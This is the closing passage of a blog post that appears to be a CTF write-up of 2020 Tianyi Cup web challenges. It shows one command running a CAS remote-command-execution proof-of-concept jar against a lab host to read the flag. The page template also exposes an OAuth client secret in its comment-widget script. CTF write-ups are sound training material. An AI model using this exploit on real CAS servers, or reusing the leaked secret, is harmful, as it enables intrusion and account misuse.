+<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808111843296.png" alt="image-20200808111843296"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar CasPoc-1.0-SNAPSHOT-jar-with-dependencies.jar http://192.168.35.158:8080/cas/login  "cat /flag"</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808122316103.png" alt="image-20200808122316103"></p>
+<p><a href="https://www.cnblogs.com/phpdragon/p/7216626.html" target="_blank" rel="noopener">参考</a></p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/08/06/2020天翼杯Web题目复现/" target="_blank" title="2020天翼杯Web题目复现">http://mount4in.github.io/2020/08/06/2020天翼杯Web题目复现/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" data-id="clg20p5ud001714uvbwqxhaed"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/08/08/2020WMCTF-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            2020WMCTF-WEB题目复现
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/07/07/2020SCTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">2020SCTFWeb题目复现</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
